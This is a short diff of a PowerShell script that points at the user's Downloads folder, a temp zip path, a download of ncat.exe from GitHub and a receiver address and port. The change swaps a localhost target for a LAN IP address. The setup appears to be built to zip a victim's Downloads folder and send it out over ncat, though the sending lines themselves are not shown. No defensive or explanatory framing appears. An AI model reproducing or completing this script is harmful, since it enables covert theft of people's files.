@@ -3,7 +3,7 @@ $downloadsFolder = "$env:USERPROFILE\Downloads"
 $zipFilePath = "$env:TEMP\Downloads.zip"
 $ncatUrl = "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe"  # URL to download ncat
 $ncatPath = "$env:TEMP\ncat.exe"  # Path to save downloaded ncat
-$targetIP = "127.0.0.1"  # Update this to the receiver's IP address
+$targetIP = "192.168.43.102"  # Update this to the receiver's IP address
 $targetPort = 12345
 
 # Download ncat
